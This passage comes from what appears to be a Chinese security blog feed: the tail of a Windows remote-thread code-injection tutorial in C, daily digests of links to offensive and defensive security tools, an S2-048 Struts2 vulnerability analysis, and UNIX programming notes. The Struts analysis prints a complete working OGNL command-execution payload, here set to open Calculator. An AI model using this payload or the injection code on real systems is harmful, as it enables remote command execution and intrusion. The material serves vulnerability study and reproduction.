打开进程并获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if ( hProcess == NULL ) &#123; return ; &#125; DATA Data = &#123; 0 &#125;; // 获取kernel32.dll中相关的导出函数 Data.dwLoadLibrary = (DWORD)GetProcAddress( GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); Data.dwGetProcAddress = (DWORD)GetProcAddress( GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;); Data.dwGetModuleHandle = (DWORD)GetProcAddress( GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetModuleHandleA&quot;); Data.dwGetModuleFileName = (DWORD)GetProcAddress( GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetModuleFileNameA&quot;); // 需要的其他DLL和导出函数 lstrcpy(Data.User32Dll, &quot;user32.dll&quot;); lstrcpy(Data.MessageBox, &quot;MessageBoxA&quot;); // MessageBoxA()弹出的字符串 lstrcpy(Data.Str, &quot;Inject Code !!!&quot;); // 在目标进程申请空间 LPVOID lpData = VirtualAllocEx(hProcess, NULL, sizeof(Data), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); DWORD dwWriteNum = 0; WriteProcessMemory(hProcess, lpData, &amp;Data, sizeof(Data), &amp;dwWriteNum); // 在目标进程空间申请的用于保存代码的长度 DWORD dwFunSize = 0x1000; LPVOID lpCode = VirtualAllocEx(hProcess, NULL, dwFunSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); BOOL bRet = WriteProcessMemory(hProcess, lpCode, &amp;RemoteThreadProc, dwFunSize, &amp;dwWriteNum); if ( bRet == FALSE ) &#123; int n = GetLastError(); &#125; HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpCode, lpData, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess);&#125; 通过peid可以查看DLL的导出函数还可以通过vc6自带的dependency Walker以及CFF Explorer &nbsp;&nbsp;&nbsp;&nbsp;这种方式是直接把想要使用的API函数以及API函数所在的DLL文件都封装在一个结构体中，直接写入目标进程的空间中，最后调用CreateRemoteThread()函数即可将其运行。 tips通过windows自带工具运行DLL的两种方法1.通过regsvr32.exe 调用 例如 regsvr32 /i c:\test.dll2.通过rundll32.exe 调用 例如 rundll32.exe “c:\test.dll” ,RundllFunc FunParam3.通过Dependency Walker工具查看应用程序所使用到的动态链接库文件,此外还可以使用dumpbin工具 Reference神奇的马甲Dll By 海风月影DLL注入的几种姿势（二）：CreateRemoteThread And More]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170714安全动态]]></title>
    <url>%2F2017%2F07%2F14%2F20170714%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Stuxnet 攻击中，USB 设备被用于建立了一个隐身网络，这篇 Paper 作者研究如何检测此类看不见的网络 https://www.exploit-db.com/docs/42318.pdf CVE-2017-7529 Nginx整数溢出漏洞分析http://galaxylab.org/cve-2017-7529-nginx%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ 用 Metasploit 生成可以 Bypass macOS 版本 Avast 12.7 的 Payloadhttps://astr0baby.wordpress.com/2017/07/13/bypassing-antivirus-on-osx-10-11-with-metasploit-avast/ Samba 高危漏洞预警：Orpheus’ Lyre mutual authentication validation bypass(CVE-2017-11103)https://www.samba.org/samba/security/CVE-2017-11103.html Kerberos漏洞：Orpheus’ Lyrehttps://www.orpheus-lyre.info/ Python实现逻辑回归(Logistic Regression in Python)http://www.powerxing.com/logistic-regression-in-python/ Burglar and Hacker – When Physical Security Is Compromised by IoT Vulnerabilitieshttp://dojo.bullguard.com/blog/burglar-hacker-when-a-physical-security-is-compromised-by-iot-vulnerabilities/ PowerShell攻防进阶篇：nishang工具用法详解 http://www.4hou.com/technology/5962.html 黑产用“未来武器”破解验证码，打码小工都哭了http://www.freebuf.com/news/140151.html PSAttack：一个包含所有的渗透测试用例的攻击型Powershell脚本框架http://www.freebuf.com/sectool/139910.html Gixy nginx配置静态分析工具https://github.com/yandex/gixy 检测ip是否是蜜罐https://honeyscore.shodan.io/ 通过BMP图像像素传输后门payloadshttp://bobao.360.cn/learning/detail/3834.html 给python代码植入后门http://www.ikotler.org/InYourPythonPath.pdfhttps://github.com/SafeBreach-Labs/pyekaboo CERTitude - 应急响应处理时用于判断机器是否已经被攻破的工具https://github.com/CERT-W/certitude CVE-2017-7529 Nginx整数溢出漏洞环境搭建及复现https://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=2650473963&amp;idx=1&amp;sn=1f7b61cb9c4ecb35624873399fde7e86&amp;chksm=f00a247ec77dad684a9a3e656fd8e6bfa6a65150664464e8967d52ee2a0471dd95c2a29d360f&amp;scene=0&amp;key=9965dca0b72a0a7412bffe032f9c4393c5b8062c74579d7f6f81227feeb4315534a5687492a5fd6f3538c1670ffde65c563610a50e40b596407fa71dac39ad80ecffb6ba8deadc771f3772a0c3e8e5f7&amp;ascene=0&amp;uin=NzQxNDQ1&amp;devicetype=iMac+MacBookPro11%2C3+OSX+OSX+10.12.5+build(16F73)&amp;version=12020810&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=eWn1AgmeHyorlg%2BqvAermmIlJOHKCF9mdXTkxrJ5pUY%3D]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170713安全动态]]></title>
    <url>%2F2017%2F07%2F13%2F20170713%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 ExecScent：在真实网络下使用自适应控制协议模板挖掘新的C&amp;C域名http://paper.kakapo.ml/?p=177 Windows NTLM协议存在高危漏洞http://thehackernews.com/2017/07/windows-ntlm-security-flaw.html 构建Python BITS服务器https://safebreach.com/Post/Building-a-Python-BITS-Server 看着电影电脑怎么就被黑了？给你技术细节分析http://www.4hou.com/info/news/6201.html 解析HaaS（蜜罐即服务）&#x68;&#116;&#116;&#x70;&#115;&#x3a;&#x2f;&#47;&#109;&#x65;&#100;&#x69;&#x75;&#109;&#x2e;&#99;&#x6f;&#109;&#47;&#x40;&#102;&#x6f;&#111;&#115;&#112;&#105;&#100;&#121;&#x2f;&#109;&#121;&#x2d;&#x73;&#101;&#x72;&#x76;&#x65;&#x72;&#x6c;&#x65;&#115;&#x73;&#45;&#x66;&#x72;&#97;&#x6e;&#x6b;&#x65;&#x6e;&#115;&#x74;&#x65;&#x69;&#x6e;&#x2d;&#x66;&#x6f;&#114;&#x2d;&#104;&#111;&#x6e;&#101;&#121;&#x70;&#x6f;&#x74;&#x73;&#x2d;&#x65;&#52;&#52;&#x39;&#98;&#54;&#x33;&#97;&#x62;&#48;&#x65;&#100; htcap：Web应用扫描器https://n0where.net/recursive-web-application-scanner/ 从hash传递攻击谈相关Windows安全机制http://bobao.360.cn/learning/detail/3793.html WebSocket漏洞与防护详解http://bobao.360.cn/learning/detail/3795.html CVE-2017-0199https://github.com/bhdresh/CVE-2017-0199http://fuping.site/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/http://bobao.360.cn/learning/detail/3737.html1用的github的工具测试成功，而且自己的同样版本的office，也都是win7，一个利用成功，一个利用没成功。。。 更新：”Bypassing” Microsoft’s Patch for CVE-2017-0199http://justhaifei1.blogspot.com/2017/07/bypassing-microsofts-cve-2017-0199-patch.html LINUX 安全加固https://mp.weixin.qq.com/s/y8np-sFzik15x09536QA5w AIX渗透技巧http://bobao.360.cn/learning/detail/3750.html 如何在没有sudo 密码的情况下，执行sudo 命令https://www.cyberciti.biz/faq/linux-unix-running-sudo-command-without-a-password/ sqlite 注入http://bobao.360.cn/learning/detail/3530.html 应急响应大合集https://github.com/meirwah/awesome-incident-response/blob/master/README_ch.md 开源网络取证工具Xplico架构浅析https://www.secpulse.com/archives/57567.html 基于DOM的AngularJS沙箱逃逸技术 http://bobao.360.cn/learning/detail/3851.html 密码学在互联网业务中的点滴使用https://security.yirendai.com/news/notice/52 如何在无线网络上绕过MAC地址过滤http://www.hackingtutorials.org/wifi-hacking-tutorials/bypass-mac-filtering-on-wireless-networks/]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170712安全动态]]></title>
    <url>%2F2017%2F07%2F12%2F20170712%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 King Phisher：钓鱼活动工具包 https://n0where.net/phishing-campaign-toolkit-king-phisher/ 1从有Unique Credentials看，应该就是很6的一个工具 挖洞经验|我如何在Twitter上发现了一个CSP绕过+XSS漏洞 http://www.freebuf.com/news/139672.html 对安全审计软件的一次安全审计http://www.freebuf.com/articles/web/139719.html 基于Centos搭建ELK环境指南http://www.freebuf.com/sectool/139687.html Cobalt strike系列教程更新啦http://open.freebuf.com/category/oversea/pentest-oversea AWStats 一个免费非常简洁而且强大有个性的网站日志分析工具。 Django源码浅析http://blog.nsfocus.net/%E3%80%90django-source-analyses%E3%80%91-django-command-module/ Avanti Markets自动售货机泄露用户数据：使用生物识别的IoT设备离安全有多远？http://www.freebuf.com/news/139948.html 你不知道的Chrome开发者工具新功能http://www.freebuf.com/news/139720.html MongoDB 多实例运行在同一主机的安全隐患&#x68;&#116;&#116;&#x70;&#115;&#x3a;&#47;&#47;&#109;&#x65;&#100;&#x69;&#117;&#109;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#97;&#108;&#x65;&#120;&#98;&#121;&#107;&#47;&#109;&#x6f;&#x6e;&#x67;&#x6f;&#x64;&#x62;&#45;&#x61;&#116;&#45;&#x73;&#104;&#x61;&#x72;&#x65;&#100;&#45;&#104;&#x6f;&#x73;&#116;&#x69;&#110;&#103;&#45;&#115;&#x65;&#99;&#117;&#x72;&#x69;&#116;&#x79;&#x2d;&#x73;&#117;&#114;&#112;&#114;&#105;&#x73;&#x65;&#x73;&#x2d;&#x63;&#x34;&#52;&#x31;&#x65;&#x63;&#x62;&#56;&#52;&#x62;&#x35;&#x34; 新版本 C++ 语言（C++ 17/14/11）的新特性整理 https://github.com/AnthonyCalandra/modern-cpp-features SlackShell - 基于 Slack API 的 PowerShell 版本 C&amp;C 命令控制实现https://github.com/bkup/SlackShell Social Engineering Toolkit (SET) v7.7 发布 https://github.com/trustedsec/social-engineer-toolkit/releases/tag/7.7 inpayloads - 基于 Python2.7 编写的免杀 Windows Payload 生成器https://github.com/nccgroup/Winpayloads 利用JS加载.Net程序https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/ LFISuite：自动化LFI（本地文件包含）利用工具（反弹shell）+漏洞扫描https://github.com/D35m0nd142/LFISuite 在glibc malloc中线程本地缓存 老外通过telegram作为辅助工具进行大规模的sql注入攻击https://threatpost.com/telegram-controlled-hacking-tool-targets-sql-injection-at-scale/126763/ 通过子域名绕过uber的单点认证https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/ Bypassing Win10 powershell script logging without adminhttps://www.peerlyst.com/posts/red-teams-can-now-bypass-the-new-windows-10-powershell-script-logging-without-admin-privileges-gina-robertson FAKENET-NG：下一代动态网络分析工具http://www.mottoin.com/86354.html]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170711安全动态]]></title>
    <url>%2F2017%2F07%2F11%2F20170711%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 mac软件推荐 CheatSheet 你还在为记不住各种应用的快捷键而烦恼吗？CheatSheet will help youhttps://www.cheatsheetapp.com/CheatSheet/?utm_source=next.36kr.com 1亲测好用 Linux 后渗透测试常用命令列表https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List 企业如何防御恶意bot流量https://www.520waf.com/2017/07/05/bot/ 1甲方的小伙伴可以关注一下 将普通 Shell 提升为交互式 TTY Shell 的方法一览 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/msfvenom生成各种payload的命令http://www.metasploit.cn/thread-2058-1-1.html 1文章中 Long story short，是长话短说的意思吗？[🤦‍♀️] 黑夜的猎杀-盲打XXEhttps://xianzhi.aliyun.com/forum/read/1837.html 揭秘 Google 精英黑客团队 Project Zero https://mp.weixin.qq.com/s/enxoIfpBxNh1qTMY8sLZ6g 隔离网络高级威胁攻击预警分析报告http://bobao.360.cn/learning/detail/4086.html windows键盘记录器http://bobao.360.cn/learning/detail/4084.htmlhttp://bobao.360.cn/learning/detail/4085.html 低漏报检测java反序列化漏洞方法http://www.polaris-lab.com/index.php/archives/331/ burp-vulners-scanner：基于Vulners.com 漏洞数据库的一款burp漏扫插件https://github.com/vulnersCom/burp-vulners-scanner 1谁来写篇burp好用的插件的文章0.0 CDN校验漏洞催生海量网络投毒http://www.freebuf.com/news/139358.html Android中免root的hook框架Legend原理解析http://www.wjdiankong.cn/android%E4%B8%AD%E5%85%8Droot%E7%9A%84hook%E6%A1%86%E6%9E%B6legend%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/ 移动应用安全开发指导http://file.digitalinterruption.com/Secure%20Mobile%20Development.pdf 如何攻击ATM机及其组件http://www.dejavusecurity.com/blog/2017/7/10/mixed-tape-vol-a 1黑阔们，发财的机会来了,：P CVE-2015-1641 Word 利用样本分析http://paper.seebug.org/351/ Invoke-AutoIt：将AutoIt DLL和PowerShell脚本加载到内存中并执行指定的命令https://github.com/byt3bl33d3r/Invoke-AutoIt]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170710安全动态]]></title>
    <url>%2F2017%2F07%2F10%2F20170710%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Dr0p1t-Framework：一个可以绕过多数杀软的木马生成框架http://www.freebuf.com/sectool/139455.html 恶性病毒Pengex通过系统盘疯狂传播，攻击所有主流杀软却唯独放过腾讯http://www.freebuf.com/news/139381.html RDPInception：一种利用远程桌面的新型攻击方式 http://www.freebuf.com/articles/system/139156.html MSRC-Security-Research - 微软 MSRC 团队近几年演讲资料的汇总https://github.com/Microsoft/MSRC-Security-Research xray - 从公共网络中侦听，映射与 OSINT 情报收集的工具https://github.com/evilsocket/xray API-Security-Checklist - 开发者的 API 安全检测清单https://github.com/shieldfy/API-Security-Checklist salt-scanner - 基于 Salt Open 和 Vulners audit API 的 Linux 漏洞扫描器https://github.com/0x4D31/salt-scanner S2-048 测试 POChttps://github.com/jas502n/st2-048 如何判断微信聊天记录被删除过？https://mp.weixin.qq.com/s?__biz=MzI3Mjc0MjkwMQ==&amp;mid=2247483675&amp;idx=1&amp;sn=669c2fe44425310e86b003c6ac41acb7 Android安全项目入门篇https://mp.weixin.qq.com/s?__biz=MzI4NjEyMDk0MA==&amp;mid=2649846643&amp;idx=1&amp;sn=0286e8f1b3e6da0acbd129cb248eac2a 利用IODINE传输DNS数据http://www.adeptus-mechanicus.com/codex/dnstun/dnstun.php bind XXE 漏洞案例https://blog.zsec.uk/blind-xxe-learning/ Apache Shiro反序列化漏洞的利用（非数组的数据反序列化）https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html 利用模板注入攻击关键基础设施http://blog.talosintelligence.com/2017/07/template-injection.html CDN校验漏洞催生海量网络投毒http://www.freebuf.com/news/139358.html]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[s2-048漏洞分析]]></title>
    <url>%2F2017%2F07%2F08%2Fs2-048%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 前言&nbsp;&nbsp; 昨天下午下班前看到朋友圈有人已经在转发s2-048的漏洞通告，见链接 https://cwiki.apache.org/confluence/display/WW/S2-048,晚上的时候简单的复现了一下，今天没事儿就跟了一下。 0x02 从官方通告到poc&nbsp;&nbsp; 从官方通告到概念性证明这是一个考验能力的地方，但是万事都有技巧和经验。官方通告往往信息量是最大的，首先，通过官方通告如下图所示可以得到至少五个重要的信息点 1.这是一个远程命令执行漏洞 2.这个漏洞存在showcase示例应用中，这个很重要，能让我们最快的时间去找到相应的漏洞环境 3.这个漏洞struts1的插件有关 4.这个漏洞影响的版本是struts 2.3x系列 5.漏洞的解决方法，这里是代码的正确写法，此处是找到漏洞触发点的关键1.首先，我们从官网http://struts.apache.org/download.cgi#struts25101下载对应的struts以及showcase。2.将war包部署到应用服务器，我这里用了tomcat，打开struts-showcase如下图所示：3.查找关键性代码可以看到箭头所指的地方就使用到了官方不’提倡’使用的规范，应该就是这个地方了。打开这个页面可以看到这里有三个输入的地方，这里应该就是恶意代码插入的地方。4.代码调试这个时候就该上eclipse了，跟踪一下数据流向。我们先在此处加个断点通过调试会发现M0rk参数会进入buildMessageFormat()这个函数里面很熟悉有木有，这个就是s2-045漏洞(详见之前的文章http://www.cnblogs.com/mrchang/p/6515150.html)里面的利用点，直接利用不就行了嘛。直接将name参数修改为s2-045的payload就行了.payload如下：1%&#123;(#szgx=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos; open /Applications/Calculator.app&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125; 0X03 总结&nbsp;&nbsp; 这里没有具体的分析这个struts1插件功能以及payload，只是简单和大家分享一下从官方通告到自己出poc的一个流程，还是有经验可循的，当你分析的漏洞多了，这个过程会很快。水了一篇：）]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170707安全动态]]></title>
    <url>%2F2017%2F07%2F07%2F20170707%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 mac工具推荐 socat (mac下可以直接使用brew安装)http://brieflyx.me/2015/linux-tools/socat-introduction/ mac工具推荐 辅助Homebrew的两大利器Cakebrew &amp; LaunchRockethttp://www.jianshu.com/p/a172455273db 1之前安装了个brew安装了个nginx，然后总是重启电脑的时候自启动，今天发现了这个launchRocket可以管理这些brew安装的程序或服务。 trick：用好alias可以提高效率 Apache CVE-2017-7659漏洞重现及利用分析http://www.freebuf.com/vuls/139042.html pdf的一些技巧https://github.com/corkami/docs/blob/master/PDF/PDF.md wmi攻击篇https://threathunter.org/topic/593fe0e39c58e020408a79d1 careers.twitter.com的一个绕过CSP的XSS &#104;&#116;&#x74;&#112;&#115;&#58;&#47;&#x2f;&#109;&#101;&#100;&#105;&#x75;&#109;&#46;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#x74;&#x62;&#x6d;&#x6e;&#117;&#108;&#x6c;&#47;&#109;&#97;&#x6b;&#x69;&#x6e;&#x67;&#45;&#97;&#110;&#x2d;&#x78;&#x73;&#115;&#45;&#x74;&#114;&#x69;&#103;&#x67;&#x65;&#114;&#x65;&#x64;&#x2d;&#x62;&#x79;&#x2d;&#99;&#115;&#x70;&#45;&#98;&#x79;&#112;&#97;&#x73;&#x73;&#x2d;&#111;&#110;&#45;&#116;&#119;&#105;&#116;&#116;&#101;&#x72;&#45;&#53;&#x36;&#x31;&#x66;&#x31;&#x30;&#x37;&#x62;&#x65;&#51;&#x65;&#53; 一个人的企业安全建设之路http://www.freebuf.com/news/130971.html pyrasite – 向python进程注入代码工具http://www.freebuf.com/sectool/139120.html 基于 Cobalt Strike 实现针对 Google 域名的 Domain Fronting，Domain Fronting 是一种利用高信誉域名隐藏通信远程终端的技术https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/ 使用 GPO 进行持久化控制与横向渗透http://www.sicherheitsforschung-magdeburg.de/uploads/journal/MJS_052_Willi_GPO.pdf Bitscout - 一款用于远程数字取证的工具https://securelist.com/bitscout-the-free-remote-digital-forensics-tool-builder/78991/https://github.com/vitaly-kamluk/bitscout phpggc - 为 PHP 反序列化漏洞自动化构建攻击链并生成 Payload 的工具https://www.ambionics.io/blog/php-generic-gadget-chains 用于检测多个漏洞利用 Exploits 的 Suricata 规则，还包括一个 Exploit pcap 包https://github.com/ptresearch/AttackDetection]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170706安全动态]]></title>
    <url>%2F2017%2F07%2F06%2F20170706%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态1.Blind Java Deserialization Vulnerability - Commons Gadgets https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html?from=timeline&amp;isappinstalled=0&amp;nsukey=9kJ1B1j97qducezDVQEQf71Q9N7Z%2BrX89rtbQThhDacTUP7hYFh6p9rJ19ywbj4EbfUXyRR%2BMM3vfkUha0bLe%2BpdXMc6njAiHEr9SL4W4Wc7GYwXTZHcStXN7zj5L531FAuINRdnM9PAKFzu0Bkg7l4%2F1RtIp0UEKSbPBH3lMFBbCkSOsmjNtZzeyX%2B2AYOT2.mac 工具推荐之 Alfredhttp://www.jianshu.com/p/f77ad047f7b0http://myg0u.com/python/2015/05/23/tutorial-alfred-workflow.htmlhttps://www.zhihu.com/question/206566801提升工作效率的工具，Geek必备，推荐，尤其是workflow Powershell 攻防进阶篇http://www.4hou.com/technology/5962.html PSAttack：一个包含所有的渗透测试的powershell脚本框架http://pentestit.com/psattack-offensive-powershell-console/ 潘多拉魔盒开启：全国多省爆发大规模软件升级劫持攻击 http://www.freebuf.com/news/139206.html 永恒之蓝漏洞（MS17-010）图形化扫描器-Eternal Blueshttp://www.freebuf.com/column/139293.html FakeNet-NG - FireEye 开源的一款网络分析工具， Python 语言编写，可以用于发送标准协议、自定义协议数据包https://www.fireeye.com/blog/threat-research/2017/07/linux-support-for-fakenet-ng.htmlhttps://github.com/fireeye/flare-fakenet-ng VirtualAPK - 滴滴开源的一个 Android 插件框架，该框架可以动态加载和运行 APK 文件https://github.com/didi/VirtualAPK 恶意软件沙盒逃逸技术总结，来自 Moony Li https://github.com/SilverMoonSecurity/SandboxEvasion windows漏洞价值分类排名http://www.4byte.cn/learning/44312.html1貌似是一个前辈二进制技术大牛的博客。关注！]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[unix环境高级编程笔记]]></title>
    <url>%2F2017%2F07%2F05%2Funix%E7%8E%AF%E5%A2%83%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[第一章 系统调用和库函数，应用程序既可以调用系统调用也可以调用库函数，很多库函数则会调用系统调用。系统调用通常提供一种最小接口，而库函数通常提供比较复杂的功能。注意区别不带缓冲的IO和标准IO，标准IO函数提供了一个带缓冲的接口，使用标准IO函数无需担心如何选取最佳的缓冲区大小。第二章 UNIX标准及实现 本章主要介绍了UNIX的标准。知道ISO c从c99到c11的转变就行了。linux、macos、aix等这些都属于unix的分支。当然这其中就要有各种复杂的兼容性的问题了。第三章 文件I/O 理解文件描述符当打开一个现有文件或者创建一个新文件时候，内核向进程返回一个文件描述符，按照惯例，UNIX系统shell把文件描述符0与进程的标准输入关联，文件描述符1与标准输出关联，文件描述符2与标准错误惯例。 理解当前文件偏移量 lseek 学会使用linux的od命令 od - dump files in octal and other formats还要理解磁盘块~暂时还不太理解~ 文件共享unix支持在不同进程间共享打开文件第四章 文件和目录 unix文件类型有以下几种 1.普通文件 2.目录文件 3.块特殊文件 4.字符特殊文件 5.FIFO 6.套接字 7.符号链接第五章 标准IO库 对一个进程预定义了3个流，并且这三个流可以自动地被进程使用，他们是：标准输入、标准输出和标准错误，这三个标准IO流通过预定义文件指针stdin/stdout和stderro加以引用，这三个文件指针定义在头文件中。第六章 系统数据文件和信息 研究一下linux和windows下密码破解的原理，包括mimikatz和jhon the ripper工具的原理第七章 进程环境 c程序一直有以下几部分组成：1.正文段2.初始化数据段3.未初始化数据段4.栈5.堆感想 研究原理unix权限的原理，可以使用c语言编写一个类似chmod的命令，对unix的权限问题就有一个比较深入的理解了。 其实研究unix底层相关的东西还是挺有意思的一件事情Referencd http://www.cnblogs.com/52php/p/5681701.html http://www.swanlinux.net/categories/%E3%80%8Aunix%20%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E3%80%8B-Note/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170704安全动态]]></title>
    <url>%2F2017%2F07%2F05%2F20170704%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态0.Windows必备神器Cmder使用教程 http://jingyan.baidu.com/article/63acb44acc855461fcc17ea6.html1.标准化建设之网络安全应急响应浅析https://secvul.com/topics/707.html1甲方的小伙伴可以看下 2.mac安全小工具http://www.freebuf.com/column/137465.html3.挖洞经验|雅虎小企业服务平台Luminate身份认证漏洞 http://www.freebuf.com/vuls/138710.html4.黑产大数据：手机黑卡调查http://www.freebuf.com/articles/others-articles/135317.html5.通过非数字和字符的方式实现PHP WebShell http://www.freebuf.com/articles/web/138687.html1老生常谈的问题了 6.利用Rsyslog隐藏系统后门http://www.freebuf.com/articles/system/138391.html7.玩转大数据——Docker轻松搭建分析环境http://blog.nsfocus.net/play-big-data-dockereasily-build-analysis-environment/8.linux 用户操作行为审计配置方法研究http://blog.nsfocus.net/linux-research-user-operation-behavior-audit-configuration-method/9.据 FireEye 报道，定向攻击中越来越多地开始使用混淆和逃逸技术 https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html10.ssl_logger - 解密并记录进程 SSL 流量的工具 https://github.com/google/ssl_logger Docker 安全部署手册https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines 基于 SetThreadContext() 和 NtContinue() 实现反射式 DLL 注入https://zerosum0x0.blogspot.com/2017/07/threadcontinue-reflective-injection.html LFISuite - 本地文件包含漏洞的自动化扫描、攻击工具 https://github.com/D35m0nd142/LFISuite filewatcher - macOS 下的一个简单审计套件，可以审计所有事件并根据文件名或进程名进行过滤https://github.com/m3liot/filewatcher 初学Windows内核漏洞利用（一）：搭建实验环境 https://mp.weixin.qq.com/s/v6BsjpLU9dpYHEXsFkIUfg]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170705安全动态]]></title>
    <url>%2F2017%2F07%2F05%2F20170705%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[1这两天有其它事儿停更了两天，今天跟上。 每日安全动态0.通过 DNS Rebinding 获取访客 QQ 号 https://segmentfault.com/p/1210000010014129/read1.【技术分享】从PhantomJS图片渲染中的XSS漏洞到SSRF/本地文件读取漏洞http://bobao.360.cn/learning/detail/4061.html2.windows日志的删除与绕过 https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/3.ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真/伪预处理分析 https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html4.【技术分享】一封伪造邮件引发的研究http://bobao.360.cn/learning/detail/4056.html5.Metasploit中smb_ms17_010.rb面临139/TCP时的缺陷http://scz.617.cn/windows/201707031558.txt6.Joy：一款用于捕获和分析网络数据包的软件，可被用于网络研究，取证和安全监控http://www.freebuf.com/column/138935.html 另类RDP攻击手段http://bobao.360.cn/learning/detail/4055.html 记一次境外站渗透过程http://ecma.io/745.html 文档型漏洞攻击研究报告http://bobao.360.cn/learning/detail/4054.html 利用系统特性伪装成一个免密登陆后门http://www.freebuf.com/articles/system/138753.html 通过服务器日志溯源web应用攻击路径http://www.freebuf.com/articles/web/138867.html 老听别人说加密算法，现在给你个机会深入了解下 http://www.freebuf.com/articles/database/138734.html 【技术分享】Python沙箱？不存在的http://bobao.360.cn/learning/detail/4059.html CTF线下攻防赛总结http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/ WSUXploit - 利用 WSUSpect 代理作为中间人成功注入假 WSUS 升级包的工具http://pentestit.com/wsuxploit-weaponized-wsus-exploit-script/ Susanoo - 一个 REST API 安全测试框架https://github.com/ant4g0nist/Susanoo sshttp - 可以将 SSH 服务隐藏在 HTTP 服务之后 https://github.com/stealth/sshttp OOB（out 